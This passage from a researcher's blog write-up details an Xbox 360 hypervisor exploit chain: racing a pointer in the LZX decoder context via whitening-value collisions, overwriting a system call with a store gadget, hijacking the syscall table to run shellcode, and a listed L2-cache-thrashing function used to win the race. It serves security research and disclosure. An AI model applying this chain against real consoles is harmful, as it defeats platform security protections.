						<td><div><p><span>typedef</span><span> </span><span>struct</span></p><p><span>{</span></p><p><span>	</span><span>/* pointer to beginning of window buffer */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_mem_window</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>/* input (compressed) data pointers */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_input_curpos</span><span>;</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_end_input_pos</span><span>;</span></p><p><span>	</span><span>/* output (uncompressed) data pointer */</span></p><p><span>	</span><span>byte</span><span>*</span><span>				</span><span>dec_output_buffer</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>	</span><span>/* memory allocation functions */</span></p><p><span>	</span><span>PFNALLOC			</span><span>dec_malloc</span><span>;</span></p><p><span>	</span><span>PFNFREE				</span><span>dec_free</span><span>;</span></p><p><span>	</span><span>long</span><span>*</span><span>				</span><span>dec_memory</span><span>;</span></p><p><span>	</span><span>.</span><span>.</span><span>.</span></p><p><span>}</span><span> </span><span>t_decoder_context</span><span>;</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>Looking at the decoder context structure there’s a couple juicy pointers we could try and attack. The <code>dec_malloc</code> and <code>dec_free</code> pointers are function pointers so overwriting these would result in the hypervisor jumping directly to some shell code we control. The <code>dec_output_buffer</code> pointer contains the address where decompressed data should be written to, so overwriting this pointer would result in data being written to any real mode address we choose (such as hypervisor code or data). All we need to do is generate the ciphertext for the address we want to write into the decoder context structure and the hypervisor will gladly use any real mode address we put there, whether it points to protected, encrypted, or unprotected memory. So why would Microsoft store this data in encrypted memory and not protected memory if they knew it could be modified asynchronously by kernel mode?</p>



<h2>Analyzing the Payload</h2>



<p>When the system update process is running and the 2nd stage bootloader needs to be updated, the updater application can have the hypervisor run this XKE payload and it’ll build an updated boot chain for the console in memory. The way this is supposed to work is kernel mode creates one large memory allocation in unprotected memory (around 700-800 KB) that gets divided up into different regions. These regions include a header, update data, decompressed bootloader data, LZX scratch buffer, and a region for the newly updated boot chain.</p>



<p>When the payload starts running it’ll relocate these regions in-place to either encrypted or protected memory depending on the size of the region. The header and compressed update data are relocated to protected memory as both regions are smaller than 64KB, and the decompressed bootloader data, LZX scratch buffer, and updated boot chain are relocated to encrypted memory as each region is too large to fit into a single slot of protected memory (64KB). Technically speaking each region could fit into protected memory if it spanned more than one slot but because a change in slot means a change in the upper 32-bits of a real mode address you’d have to handle this address break in code. You can’t just roll off the end of the 64KB page for slot N and into slot N+1 as even though the memory may be physically contiguous the addresses for each slot are not.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8305f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1144" height="720" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/working_buffer_layout.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/working_buffer_layout.png 1144w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-300x189.png 300w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-768x483.png 768w, https://icode4.coffee/wp-content/uploads/working_buffer_layout-110x70.png 110w" sizes="auto, (max-width: 1144px) 100vw, 1144px"><figcaption>Figure 4: Layout of the working buffer</figcaption></figure></div>


<p>Once the memory is relocated the payload will process the update data which is a compressed, encrypted, RSA signed blob that contains every possible 2nd stage bootloader for all the different hardware revisions of the console. The payload will first verify the RSA signature (that only Microsoft can sign) is valid, then decrypt the data, and then decompress it into the decompressed data region. Next the payload will scan a lookup table in the header of the compressed blob that contains a listing of every bootloader in the blob, what CPU, GPU, and HANA chip they match to, and try to match one of the entries to the console. If a match is found and the blob contains an updated 2nd stage bootloader for the console, the payload will craft a new boot chain and store it in the final region of the data buffer.</p>



<p>The size of the LZX scratch buffer is calculated as <code>sizeof(LZX_DECODER_CTX) + 2 * window_size</code>, where <code>window_size</code> is the block size of data to be compressed. In other words, the input data is processed in blocks of <code>window_size</code> bytes and compressed. To decompress a block you’ll need a buffer of <code>window_size</code> bytes to hold the decompressed data. In the case of this payload the window size chosen was 0x8000 bytes (32KB), thus the size of the scratch buffer is <code>sizeof(LZX_DECODER_CTX) + 0x10000</code> and won’t fit into a single slot of protected memory. Had the window size been slightly smaller the scratch buffer would have been able to fit into protected memory. Fortunately for us this works to our advantage because we can attack the encrypted memory for the scratch buffer using the techniques discussed earlier.</p>



<h2>Attacking LZX: Attempt 1</h2>



<p>In order to attack one of the pointers in the LZX decoder context structure we’ll need the ciphertext for some oracle data to check for a whitening value collision, and the ciphertext for the malicious pointer we want to write into the structure. Using the technique described above the attack would look something like this:</p>



<ol>
<li>Obtain the ciphertext for the oracle data and malicious pointer we want to write. For this attack we’ll target the <code>dec_malloc</code> function pointer in the LZX decoder structure. The pointer should be a real mode address that points to some shell code we setup in unprotected memory.</li>



<li>Create two threads:
<ul>
<li>Thread A will be the payload thread and continuously run the bootloader update payload in a loop.</li>



<li>Thread B will be the attack thread which continuously monitors the input data for the oracle ciphertext. Once the payload relocates the input data to encrypted memory we can observe the ciphertext for it by accessing the memory from kernel mode using the unprotected pathway. Once the ciphertext observed matches our oracle ciphertext we know a whitening value collision was hit and it’s safe to overwrite the LZX decoder structure.</li>
</ul>
</li>



<li>Once a whitening collision is observed, thread B will overwrite the <code>dec_malloc</code> pointer in the LZX decoder structure with the pre-computed ciphertext for our malicious pointer (which points to our shell code).</li>



<li>If we win the race between thread B overwriting the pointer and thread A using the pointer from hypervisor mode, then the hypervisor should jump to our shell code and we’ll get full hypervisor code execution.</li>
</ol>



<p>For the oracle data I chose to use the ciphertext for the first 16 bytes of LZX decoder structure with values of all 00s. When the payload does the in-place relocation of the LZX scratch buffer it’ll zero-initialize it afterwards. By capturing the ciphertext for 16 bytes of 00s at the same address I can use the zero-initialization of the scratch buffer as a start indicator to know when to hammer the decoder structure with the ciphertext for our malicious function pointer. This is the earliest point in time we can detect a whitening value collision and we’re gonna need as much time as we can get to win the race condition.</p>



<h3>Cache Rules Everything Around Me</h3>



<p>Unfortunately attacking the <code>dec_malloc</code> pointer isn’t feasible and the reason is that the CPU L2 cache is just too big for the data containing the decoder structure to age out of cache in the time frame we need. When the XKE payload goes to decompress the input data it’ll call <code>LDICreateDecompression</code> which takes in either two function pointers (one for <code>dec_malloc</code> and one for <code>dec_free</code>) or a pointer to a pre-allocated scratch buffer. In the case of this payload the function pointers are always null and a pointer to the LZX scratch buffer region is provided instead. Regardless of which you provide, the <code>dec_malloc</code> pointer will always be set to the value provided in the function arguments.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b83a6a&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="583" height="724" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1.png 583w, https://icode4.coffee/wp-content/uploads/ldi_create_decompression_pfma-1-242x300.png 242w" sizes="auto, (max-width: 583px) 100vw, 583px"><figcaption>Figure 5: Disassembly of dec_malloc being set to NULL</figcaption></figure></div>


<p>Immediately after the <code>dec_malloc</code> function pointer is set to NULL <code>LDICreateDecompression</code> calls <code>sub_2668</code> which will initialize some more of the decoder structure and then try to use the <code>dec_malloc</code> pointer if it’s non-NULL.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8418c&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="768" height="793" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-768x793.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-768x793.png 768w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-290x300.png 290w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4-1045x1080.png 1045w, https://icode4.coffee/wp-content/uploads/ldi_init_use_pfma-4.png 1055w" sizes="auto, (max-width: 768px) 100vw, 768px"><figcaption>Figure 6: Disassembly of dec_malloc being used</figcaption></figure></div>


<p>This means we need our malicious ciphertext to be committed to memory by thread B before it’s accessed in <code>_dec_mem_alloc</code>, AND we need the cache line containing the <code>dec_malloc</code> pointer to either age out or be evicted from L2 cache of thread A. Unfortunately, there’s less than 300 instructions between these two operations and the L2 cache is too large for the data to age out or be evicted in this time frame. It’s also not possible to attack the <code>dec_free</code> pointer because the decompression routine never calls <code>LDIDestroyDecompression</code> so the <code>dec_free</code> pointer will never be checked and called. There are some additional things I did to try and put pressure on the CPU L2 cache which I’ll dig into in part 3, but as it stands attacking the <code>dec_malloc</code>/<code>dec_free</code> pointers is a no-go.</p>



<h2>Attacking LZX: Attempt 2</h2>



<p>Next attempt was trying to attack the <code>dec_output_buffer</code> pointer. When the decompression routine is run the compressed input buffer is decompressed in blocks. Each block will result in a call to <code>LDIDecompress</code> which decompresses the block and copies the decompressed data to the output buffer specified by the <code>dec_output_buffer</code> pointer. The goal for this attack was to successfully overwrite the <code>dec_output_buffer</code> pointer and get the decompressed data copied an address we specify.</p>



<p>This attempt would work mostly the same as the previous attempt except I’d be hammering the <code>dec_output_buffer</code> pointer to point into the last segment of the hypervisor. This particular area doesn’t contain any important code or data so I can freely trash it and observe the ciphertext for it from kernel mode without impacting stability of the hypervisor. Once the ciphertext changes I’ll know I won the race and got the XKE payload to use my malicious <code>dec_output_buffer</code> pointer to overwrite part of the hypervisor. This attack wouldn’t get me hypervisor code execution directly but instead I’d get a write to an arbitrary real mode address from hypervisor context. I’d need to find a way to turn this write into code execution but first I needed to prove the attack worked and that I wouldn’t be blocked by CPU L2 cache.</p>



<p>Since I was focused on determining if the attack was possible and doing all my testing on a console that was already hacked, I decided to modify the XKE payload and make a slight change that would improve my odds of winning the race condition. Each time the XKE payload runs it’ll use a random whitening value for the in-place memory relocation of the LZX scratch buffer. I modified the payload to instead use a constant value of 0x111. This would allow me to skip checking for a whitening value collision and just hammer the ciphertext for the <code>dec_output_buffer</code> pointer continuously in a loop. If the poc worked and the attack was possible then I could worry about winning the race condition later on.</p>



<p>After deploying the poc and modified XKE payload to my hacked console I let it run and got the debug spew that the race condition had been won. The ciphertext for the last segment of the hypervisor had changed which meant this attack was (most likely) feasible. At the very least I had somewhat of an arbitrary write primitive from hypervisor context and now I needed to find a way to turn it into code execution.</p>



<p>Ignoring that I still needed to win the race condition without my static whitening value patch in place, the write primitive I now have is hardly ideal. Every time the write primitive is triggered it’s going to write 0x8000 bytes of data (the size of the block after being decompressed) that I don’t control the contents of. I made a couple attempts to try and get control of the decompressed data before it gets copied to the <code>dec_output_buffer</code> pointer but had no luck in doing so. In most cases it would cause the console to hang or the <code>LDIDecompress</code> function to fail and return early without copying any data. This was a really crappy write primitive but I knew I’d probably never find another one and this could be the only bug I ever end up finding on the console. I accepted the challenge and decided I <em>had</em> to find a way to make it work.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">When you finally get an arbitrary write primitive that works on hypervisor memory but it always writes 0x8000 bytes of data you can't reliably control the contents of, and now you have to find some unhinged way to make this useful because you know you'll never find another one <a href="https://t.co/IDKIZifzv1">pic.twitter.com/IDKIZifzv1</a></p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1833974721010151669?ref_src=twsrc%5Etfw">September 11, 2024</a></blockquote>
</div></figure>



<h2>Failure Is Not An Option</h2>



<p>The next step is to turn this 0x8000 byte write primitive into something useful. My first train of thought was to use it to perform some memory corruption on other hypervisor data that I could turn into code execution or a more controlled write primitive. I began looking through the data segment of the hypervisor for anything that could be interesting to corrupt such as pointers to other code/data, RSA public keys for code authentication, or internal data structures used by the hypervisor. I found a number of interesting targets and even found some side channels I could use to figure out exactly what data was written to memory. But as I started to conceptualize various attack vectors I quickly realized this wasn’t going to work.</p>



<p>All of the interesting bits of data I was trying to attack were sitting in a minefield of spinlocks the hypervisor uses for acquiring thread safe access to data. My plan of attack depended on specific values within the decompressed data overwriting specific variables in the hypervisor data segment. If I overwrote a spinlock with a non-zero value the hypervisor would never be able to acquire it again, and trying to acquire it would result in that thread getting stuck indefinitely in the spinlock. Some of the spinlocks didn’t matter since they were for functionality that wasn’t important. However, the spinlock that was sitting after all of the interesting data I had found was the spinlock for running XKE payloads. If I overwrote that spinlock I’d never be able to run another XKE payload and I’d basically be locked out from running the write primitive again.</p>



<p>All of the variables I was targeting depended on winning the race condition on a specific block of data. This meant I would need to run the write primitive multiple times until the right block was written, and if I could only run the write primitive once before being locked out then this wasn’t going to work. I tried to find some other variables I could attack with a single write from any decompressed block but I had no such luck in finding any. I spent a few days digging through the data segment over and over but kept coming to the same conclusion: I can’t overwrite anything in the hypervisor data segment that will work to my advantage.</p>



<h3 id="update-data-side-channel">Thinking Outside the Box</h3>



<p>After scoping out several other pieces of hypervisor data in different locations with no success I decided to think outside of the box. The data being decompressed was bootloader code (i.e. valid PPC instructions), so I could in theory execute it if I overwrite some other hypervisor code such as a system call function. But I didn’t have any way to determine which block of decompressed bootloader code was written when I won the race condition. However, side channels come in all shapes and sizes. I realized that all of the decompressed blocks had the same size <em>except</em> for the last block. If I observed the ciphertext for the hypervisor code I overwrite I could determine when I won the race on the last block by seeing that the ciphertext changed for less than 0x8000 bytes. Simply observe at two locations such that the second location is greater than the size of the last block but less than 0x8000.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b84b6d&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1201" height="274" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2.png 1201w, https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2-300x68.png 300w, https://icode4.coffee/wp-content/uploads/hypervisor_code_block_write-2-768x175.png 768w" sizes="auto, (max-width: 1201px) 100vw, 1201px"><figcaption>Figure 7: How to identify the last block</figcaption></figure></div>


<p>Now that I had a side channel to determine when the last block was written I needed to find some convenient instructions in this block that I could utilize. The idea is to overwrite some hypervisor code such that the first instructions for some hypervisor function get overwritten with some convenient instruction sequence I find in the bootloader data. To make it more complicated the only segment of hypervisor code I could overwrite was the last segment because it’s the only segment that doesn’t contain code for system critical functions which could cause the console to crash if corrupted. Most of this code was for things like IP-TV decryption and DVD drive anti-piracy routines, things that aren’t going to get executed in the background while the system is running.</p>



<p>On top of that only about 12% (or less than 0x2000 bytes) of the last hypervisor segment is code, the rest is just unused. This means any convenient instruction sequence I found in the decompressed bootloader data had to be in the first ~0x2000 bytes or I wouldn’t be able to position it such that it could overwrite the function in the hypervisor segment. The odds weren’t looking good but I began searching through the bootloader code in IDA looking for any instruction sequence I could use. After searching for a bit I found an instruction sequence that was exactly what I was looking for and at an offset that would work:</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8529f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="405" height="100" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence.png 405w, https://icode4.coffee/wp-content/uploads/block_14_instruction_sequence-300x74.png 300w" sizes="auto, (max-width: 405px) 100vw, 405px"><figcaption>Figure 8: Convenient instruction sequence</figcaption></figure></div>


<p>This instruction sequence will store the bottom byte of r4 to the memory location pointed to by r6+2 and then return. Simply put these two instructions will act as a fully controlled single byte arbitrary write. As an added bonus it has a low offset which makes placing this instruction sequence over some useless system call function in the last hypervisor segment easy. With this final piece of the puzzle I should now be able to write a full exploit chain to get hypervisor code execution.</p>



<h2>Getting Hypervisor Code Execution</h2>



<p>There are many steps in this exploit chain but the flow will go something like this:</p>



<ol>
<li>Obtain the ciphertext for the oracle data and malicious pointer we want to write over the <code>dec_output_buffer</code> pointer. The malicious pointer will point into the last segment of the hypervisor such that the offset of the stb/blr instruction sequence (0xFA8) in the last block of bootloader data will fall at the start of a system call. I chose <code>HvxFlushUserModeTb</code> because it’s the last system call in the segment.</li>



<li>Create two threads:
<ul>
<li>Thread A will be the XKE payload thread that will continuously run the bootloader update payload in a loop.</li>



<li>Thread B will be the attack thread and continuously monitor the XKE input data for the oracle ciphertext. Once the payload relocates the input data to encrypted memory we can observe the ciphertext for it by using the unprotected pathway. Once the ciphertext observed matches our oracle ciphertext we know a whitening value collision was hit and it’s safe to overwrite the LZX decoder structure.</li>
</ul>
</li>



<li>Once a whitening collision is hit thread B will overwrite the <code>dec_output_buffer</code> pointer in the LZX decoder structure with the ciphertext for our malicious pointer.</li>



<li>We’ll know if the race was won because we can observe the ciphertext for the last segment of the hypervisor and see that it changed after the XKE payload was run. By observing the ciphertext in two locations we can determine if less than 0x8000 bytes of data was written which indicates the last block was written.</li>



<li>Once the race has been won on the last block the instructions for the <code>HvxFlushUserModeTb</code> system call will be replaced with the stb/blr instruction pair. We can now execute this system call from kernel mode and use it as an arbitrary write primitive.</li>



<li>Using the <code>HvxFlushUserModeTb</code> write primitive overwrite an entry in the system call dispatch table to point to an instruction sequence that will get us code execution. For this I chose an instruction sequence that will jump to the address in r4, and overwrote the system call entry for <code>HvxPostOutput</code>.</li>



<li>Set r4 to point to some shell code we create and call <code>HvxPostOutput</code> from kernel mode which will cause the hypervisor to jump to r4 and execute our code. For testing I wrote some assembly code to set the console’s ring of light to full orange and return the value 0x41414141.</li>
</ol>



<p>After coding this up and deploying it to my hacked console I let the exploit run. After a minute or two I got the debug spew that the race had been won on the last block and the exploit ran. I could see the console’s ring of light was lit full orange and the shell code returned 0x41414141 back to kernel mode.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b85bb7&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="412" height="199" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/race_hit_payload_ran.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/race_hit_payload_ran.png 412w, https://icode4.coffee/wp-content/uploads/race_hit_payload_ran-300x145.png 300w" sizes="auto, (max-width: 412px) 100vw, 412px"><figcaption>Figure 9: Debug output from the exploit</figcaption></figure></div>


<p>At this point I should be good to go, just port this over to work on a non-hacked console and we’re done, hypervisor hacked, right? There’s one thing I forgot when running the last few poc’s and that was the patch I made to the XKE payload to use a static whitening value. I kept this patch in to test the poc with the best possible conditions for winning the race, which is why the exploit triggered in 1-2 minutes. Once I remove this patch the payload will use a random whitening value every time it runs. This means not only do we have to wait for a whitening value collision but we also have to win the race condition which we’re going to fail at many times. </p>



<p>After I removed the patch and reran the exploit I wasn’t even getting debug spew that the race condition was being won for any block, even after 30 minutes there was still nothing. It was starting to seem like this attack wasn’t going to work but I wasn’t ready to give up yet.</p>



<h2>Introducing Thread Feng Shui</h2>



<p>To try and get a better idea of what was going on I wrote some code/patches to record timestamps for each thread as the XKE payload was running. This gave me timestamps in microseconds for when the XKE payload relocated the LZX scratch buffer to encrypted memory, when it started to decompress each block of input data, and when the attack thread would start/stop hammering the LZX decoder structure. From the timing data I was able to see that by the time the attack thread was able to observe the whitening value collision the payload thread had already decompressed most of the input data. Which meant that by the time the attack thread got the malicious ciphertext flushed to RAM the XKE payload was already done running.</p>


<div>
<figure data-wp-context="{&quot;imageId&quot;:&quot;67c61f5b8630f&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="400" height="477" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on-async--click="actions.showLightbox" data-wp-on-async--load="callbacks.setButtonStyles" data-wp-on-async-window--resize="callbacks.setButtonStyles" src="https://icode4.coffee/wp-content/uploads/cpu_threads.png" alt="" srcset="https://icode4.coffee/wp-content/uploads/cpu_threads.png 400w, https://icode4.coffee/wp-content/uploads/cpu_threads-252x300.png 252w" sizes="auto, (max-width: 400px) 100vw, 400px"><figcaption>Figure 10: Die shot of the Xbox 360 CPU</figcaption></figure></div>


<p>When you create a software thread on the Xbox 360 you can specify which physical hardware thread you want it to run on. I speculated that what hw thread I ran the software threads on actually mattered, and that perhaps the distance to the FSB/L2 cache or inner logic of the L2 crossbar made a difference in how fast the operations completed. To test this I tried a number of different configurations of placing the software threads on different hardware threads and eventually found a configuration that allowed me to win the race condition. I suspected that putting the payload thread as far away from the FSB/L2 cache as possible and the attack thread as close as possible would have had the best results, however, this wasn’t the case.</p>



<p>The configuration with the best results was running the attack thread on hw thread 0 and the payload thread on hw thread 1. It seemed like scheduling them on different CPU cores actually hurt the odds of winning the race condition, and they had to be on the same core. Core 0 also had the best results compared to putting both threads on core 1 or 2. I know basically nothing about how CPUs work at a hardware level, or the inner workings of L1/2 cache and memory transactions. But what I suspect is happening is that each CPU core has its own load/store queues for performing memory transactions. Putting both threads on the same CPU core causes the memory transactions to be queued onto the L2 crossbar together when they would otherwise be queued separately if run on different cores. Put simply, running on the same core batches the loads/stores from both threads when they would otherwise be performed individually, and this significantly reduces the transaction times.</p>



<figure><div>
<blockquote data-width="470" data-dnt="true"><p lang="en" dir="ltr">I never would have thought the physical distance between CPU cores and L2 cache/FSB would make a difference when trying to win a race condition but for the one I'm exploiting it's the difference between non exploitable to exploited. I guess every nanometer counts</p>— Ryan M (@Grimdoomer) <a href="https://twitter.com/Grimdoomer/status/1835754498318606378?ref_src=twsrc%5Etfw">September 16, 2024</a></blockquote>
</div></figure>



<h2>Abusing the CPU for Fun and <s>Profit</s> Cache</h2>



<p>Now that I was able to win the race condition with an unmodified version of the XKE payload I at least knew the attack was theoretically possible. However, the rate at which the race condition was being won was abysmal, and it appeared that the race was only being won during the first half of the decompression process. This meant there was a slim chance of winning the race when the last block was being decompressed. Starting with the race condition success rate I knew this was largely due to how big the L2 cache was. Because the payload thread was more likely to fetch data from cache instead of RAM it meant more missed opportunities for it to fetch my malicious ciphertext from RAM. So if I could find a way to thrash L2 cache the race condition success rate should improve.</p>



<p>The Xbox 360 CPU has a 1MB, 8 way associative L2 cache, meaning each of the 8 pathways can map to 128KB of cache space. One of the interesting features of the Xbox 360 is that you can lock access to sections of L2 cache (as well as the pathways) and map it to a virtual address that the GPU can access. Yes, the GPU can read directly from the CPU’s L2 cache. The idea is that instead of having the CPU write data to RAM and then the GPU read it, you can put the data in L2 cache and have the GPU read it directly. This reduces the number of memory transactions from 2 to 1. There are some other performance benefits to this feature, but what it means for us is we have a way to reduce the amount of L2 cache the CPU can use. After figuring out how to use the <code>XLockL2</code> kernel API I was able to write the following helper function:</p>



<div id="urvanov-syntax-highlighter-67c61f5b716a5894788306" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p></div>
				</td>
						<td><div><p><span>void</span><span> </span><span>LockAndThrashL2</span><span>(</span><span>int</span><span> </span><span>index</span><span>)</span></p><p><span>{</span></p><p><span>	</span><span>// Allocate a block of 256kb cachable physical memory that will be used to lock the L2 range.</span></p><p><span>	</span><span>BYTE</span><span>*</span><span> </span><span>pPhysMemoryPtr</span><span> </span><span>=</span><span> </span><span>(</span><span>BYTE</span><span>*</span><span>)</span><span>XPhysicalAlloc</span><span>(</span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>MAXULONG_PTR</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>PAGE_READWRITE</span><span> </span><span>|</span><span> </span><span>MEM_LARGE_PAGES</span><span>)</span><span>;</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>pPhysMemoryPtr</span><span> </span><span>==</span><span> </span><span>NULL</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to allocate memory for L2 cache lock\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_OOM</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Reserve L2 cache and lock 2 of the available pathways.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>XLockL2</span><span>(</span><span>index</span><span>,</span><span> </span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>XLOCKL2_LOCK_SIZE_2_WAYS</span><span>,</span><span> </span><span>0</span><span>)</span><span> </span><span>==</span><span> </span><span>FALSE</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to reserve L2 cache range\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_RESERVE</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>	</span><span>// Fill the cache with trash data.</span></p><p><span>	</span><span>memset</span><span>(</span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>0x41</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>)</span><span>;</span></p><p><span>	</span><span>// Commit the L2 cache range and prevent it from being replaced.</span></p><p><span>	</span><span>if</span><span> </span><span>(</span><span>XLockL2</span><span>(</span><span>index</span><span>,</span><span> </span><span>pPhysMemoryPtr</span><span>,</span><span> </span><span>256</span><span> </span><span>*</span><span> </span><span>1024</span><span>,</span><span> </span><span>XLOCKL2_LOCK_SIZE_2_WAYS</span><span>,</span><span> </span><span>XLOCKL2_FLAG_SUSPEND</span><span>_</span>REPLACEMENT<span> </span><span>)</span><span> </span><span>==</span><span> </span><span>FALSE</span><span>)</span></p><p><span>	</span><span>{</span></p><p><span>		</span><span>DbgPrint</span><span>(</span><span>"Failed to commmit L2 cache range\n"</span><span>)</span><span>;</span></p><p><span>		</span><span>DbgBreakPoint</span><span>(</span><span>)</span><span>;</span></p><p><span>		</span><span>VdDisplayFatalError</span><span>(</span><span>0x12400</span><span> </span><span>|</span><span> </span><span>ERR_LOCKL2_COMMIT</span><span>)</span><span>;</span></p><p><span>	</span><span>}</span></p><p><span>}</span></p></div></td>
					</tr>
				</tbody></table>
			</div>



<p>The way this works is we first allocate a block of 256KB of physical memory that will be used to back the L2 lock. Then we reserve a portion of L2 cache that’s the same size as the physical memory allocation and fill it with data. When the CPU sees any reads and writes to this memory region it’ll redirect them to the reserved region of L2 cache. Finally, we commit the lock which prevents that region of L2 cache from being evicted. This function can be used to lock up to 512KB of L2 cache and 4 of the available pathways for an overall reduction of 50% of L2 cache. This will put a lot of pressure on the remaining L2 cache which will cause an increase in cache misses, thus increasing the likelihood of the payload thread fetching the malicious ciphertext from RAM.</p>



<p>After modifying the poc to use the <code>LockAndThrashL2</code> function I was happy to see the success rate of the race condition had gone from hitting once every 10-15 minutes down to once every 2-3 minutes. This was a huge increase and the L2 thrashing was working great. </p>



<h2>Offsetting the Race Timing</h2>



<p>The next issue to deal with was the race timing. The race was typically being won during the first half of the decompression process and since we’re targeting the last block of compressed data, I needed to find a way to shift the window of opportunity to the last half of the decompression process. Initially I tried adding a delay between when the attack thread observes the oracle ciphertext and when it starts hammering the LZX decoder structure. However, no matter how much I tweaked the length of the delay I wasn’t able to get anything consistent enough to slide the attack window to the second half of the decompression process. So I decided to take a different approach.</p>



